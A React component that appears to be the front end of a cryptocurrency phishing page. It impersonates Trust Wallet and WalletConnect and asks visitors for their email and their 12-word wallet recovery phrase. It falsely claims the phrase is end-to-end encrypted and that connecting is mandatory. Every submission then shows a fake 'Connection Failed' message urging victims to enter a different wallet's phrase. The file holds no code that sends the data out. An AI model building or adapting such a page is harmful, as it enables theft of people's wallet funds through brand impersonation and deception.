import React, { useState, useEffect } from "react";
import "./TrustWalletConnect.css";
import logo from "../assets/logo.png";
import trust from "../assets/TrustWallet.png";
import walletConnect from "../assets/WalletConnect.png";

const TrustWalletConnect = () => {
  const [showPopup, setShowPopup] = useState(false);
  const [words, setWords] = useState(Array(12).fill(""));

  // Prevent page scroll when popup is open
  useEffect(() => {
    document.body.style.overflow = showPopup ? "hidden" : "auto";
  }, [showPopup]);

  // Handle word input (no spaces allowed)
  const handleWordChange = (index, value) => {
    const sanitizedValue = value.replace(/\s+/g, "");
    const updatedWords = [...words];
    updatedWords[index] = sanitizedValue;
    setWords(updatedWords);
  };

  // Block space key
  const blockSpace = (e) => {
    if (e.key === " ") e.preventDefault();
  };

  // Check if all 12 boxes are filled
  const isFormComplete = words.every((word) => word.trim() !== "");

  return (
    <>
      {/* ================= PAGE (UNCHANGED) ================= */}
      <div className="twc-page">
        <div className="twc-logo">
          <img src={logo} alt="wallet-logo" />
        </div>

        <div className="twc-card">
          <img
            className="walletConnect"
            src={walletConnect}
            alt="walletConnect"
          />

          <div className="twc-header">
            <h2 className="twc-connect-text">CONNECT</h2>
            <div className="twc-title">
              <img src={trust} alt="trust" />
            </div>
          </div>

          <label className="twc-label-email">Enter your Email Address</label>
          <input
            type="email"
            placeholder="Email Address*"
            className="twc-input"
          />

          <label className="twc-label-email">
            Enter your Trust Wallet 12 word Secret Phrase
          </label>

          <p className="twc-info-text">
            Trust wallet must be atleast 30 days old and should have minimum
            $1 gas fees. Your Trust Wallet Phrase Key is end to end encrypted.
            No one can view or access it.
          </p>

          {/* ================= WORD INPUTS ================= */}
          <div className="twc-phrase-box">
            {words.map((word, index) => (
              <input
                key={index}
                type="text"
                placeholder={`${index + 1}. word`}
                className="twc-word-input"
                value={word}
                onChange={(e) =>
                  handleWordChange(index, e.target.value)
                }
                onKeyDown={blockSpace}
              />
            ))}
          </div>

          {/* ================= CONNECT BUTTON ================= */}
          <button
            className="twc-connect-btn"
            disabled={!isFormComplete}
            onClick={() => setShowPopup(true)}
            style={{
              opacity: isFormComplete ? 1 : 0.6,
              cursor: isFormComplete ? "pointer" : "not-allowed"
            }}
          >
            CONNECT
          </button>

          <p className="twc-note">
            Note: Trust wallet connect is mandatory as per security.
            For more contact our chat
          </p>
        </div>
      </div>

      {/* ================= POPUP ================= */}
      {showPopup && (
        <div className="twc-popup-overlay">
          <div className="twc-popup-box">
            <div className="twc-popup-icon">✕</div>
            <h3 className="twc-popup-title">Connection Failed!</h3>
            <p className="twc-popup-text">
              Your Trust Wallet is not eligible for connection.
              Please try connecting with a different Trust Wallet.
              Repeated attempts using the same wallet may result
              in account suspension.
            </p>
            <button
              className="twc-popup-btn"
              onClick={() => setShowPopup(false)}
            >
              OK
            </button>
          </div>
        </div>
      )}
    </>
  );
};

export default TrustWalletConnect;
